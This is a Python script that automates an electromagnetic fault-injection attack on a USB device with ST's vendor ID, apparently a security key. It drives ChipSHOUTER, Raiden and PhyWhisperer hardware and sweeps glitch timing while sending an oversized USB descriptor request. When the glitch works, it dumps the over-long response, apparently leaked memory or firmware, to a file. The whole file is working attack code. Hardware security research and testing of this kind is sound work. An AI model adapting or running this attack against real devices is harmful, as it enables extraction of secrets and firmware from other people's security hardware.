from collections import namedtuple
import sys

import time
import random

import phywhisperer.usb as pw
from chipshouter import ChipSHOUTER
import time
from raiden_python import raiden
import usb.core
import usb.control
import usb.util

dev = None
resp = None

def reset_target():
    phy.set_power_source("off")
    time.sleep(0.3)
    phy.set_power_source("host")   
    # raiden.set_target_power("auto")   
    print("power cycle") 

#Solo G1 X150.592 Y115.055 Z-22.288

raiden = raiden.Raiden(mhz=100, serial_dev="/dev/lab_raiden", baud= 115200, ticks= True, debug=False)
start_time = time.time()
cs = ChipSHOUTER("/dev/ttyUSB0")
cs.voltage = 470
cs.reset = 0
cs.reset = 1
cs.armed = 1
print ("ID", cs.id)
print(raiden.get_buildtime())
raiden.arm(0)
raiden.reset_glitcher()
raiden.set_param(param="CMD_VSTART", value= 1)
raiden.set_param(param="CMD_GLITCH_MAX", value= 1)
phy = pw.Usb()
phy.con(program_fpga=True)
phy.set_usb_mode('FS')
dev = None
resp = None
raw = None

Range = namedtuple('Range', ['min', 'max', 'step'])
width_range = Range(5, 5, 1)
delay_range = Range(3380, 3410, 1)
repeat_range = Range(1, 3, 1)
delay = delay_range.min
repeat = repeat_range.min
width = width_range.min
count = 0
while True:
    delay = delay_range.min
    while delay <= delay_range.max:
        width = width_range.min
        while width <= width_range.max:
            while repeat <= repeat_range.max:
                raiden.arm(0)  
                # time.sleep(0.5)
                # if cs.trigger_safe:
                raiden.reset_glitcher()	  
                raiden.set_param(param="CMD_GLITCH_DELAY", seconds= 0)
                raiden.set_param(param="CMD_GLITCH_WIDTH", seconds= width)
                raiden.set_param(param="CMD_GLITCH_GAP", seconds= 450)
                raiden.set_param(param="CMD_GLITCH_COUNT", value= 1)
                print("ChipSHOUTER absent time before trigger: {}".format(cs.absent_temp))
                print("ChipSHOUTER xformer: {}, MOSFET: {}, diode: {}  - temperature ".format(cs.temperature_xformer, cs.temperature_mosfet, cs.temperature_diode))
                print("ChipSHOUTER voltage measured: {}, set: {}".format(cs.voltage.measured, cs.voltage.set))
                print("ChipSHOUTER absent time after trigger: {}".format(cs.absent_temp))
                raiden.arm()
                # else:
                #     # print("ChipSHOUTER not safe to trigger!")
                #     if len(cs.faults_current) > 0 or len(cs.faults_latched) >0:
                #         print("Faults current: {}, latched: {}".format(cs.faults_current, cs.faults_latched))
                #         cs.armed = 0
                #         sys.exit(1)
                print("ChipSHOUTER glitched {} times, runs: {}".format(count, time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time))))
                phy.set_power_source("off")
                time.sleep(0.5)
                phy.reset_fpga()
                phy.set_usb_mode('FS')
                print("delay: {0},  width: {1}, repeat: {2}".format(delay, width, repeat), end='\r')
                phy.set_trigger(num_triggers=1, delays=[delay], widths=[50])
                # phy.set_pattern(pattern=[0x81,0x6, 0x00, 0x21, 0x00, 0x00, 0xe8, 0xfd])
                phy.set_pattern(pattern=[0x81,0x6, 0x00, 0x21, 0x00, 0x00, 0xe8, 0xfd])
                phy.arm()
                phy.set_power_source("host")
                time.sleep(0.8)
                try:
                    if phy.get_usb_mode() == "FS":
                        dev = usb.core.find(idVendor=0x0483, idProduct=0xa2ca)
                        for cfg in dev:
                            for intf in cfg:
                                if dev.is_kernel_driver_active(intf.bInterfaceNumber):
                                    try:
                                        dev.detach_kernel_driver(intf.bInterfaceNumber)
                                    except usb.core.USBError as e:
                                        sys.exit("Could not detatch kernel driver from interface({0}): {1}".format(intf.bInterfaceNumber, str(e)))
                    
                        dev.set_configuration() 
                except Exception as e:
                    print("Exception", e)
                    resp = None 
                    dev = None
                    continue
                try:
                    resp = dev.ctrl_transfer(bmRequestType=0x81, bRequest=0x6, wValue=0x2100, wIndex=0x0000, data_or_wLength=0xfde8)
                except Exception as e:
                    print("exception ctrl_transfer ", e)
                    dev = None
                    resp = None
                    continue
                while not raiden.is_finished():
                    pass
                print(resp)
                count +=1
                if resp and len(resp) > 10000:
                    print(resp)
                    print("Glitch work: delay: {0},  width: {1}, repeat: {2}\n".format(delay, width, repeat))
                    print("Len of resp", len(resp))
                    f = open("results-success.bin", "wb") 
                    f.write(bytearray(resp))
                    f.close()
                    sys.exit(0)
                repeat += 1
            width += 1
            repeat = 1
        sys.stdout.flush()
        width = width_range.min
        delay += 1

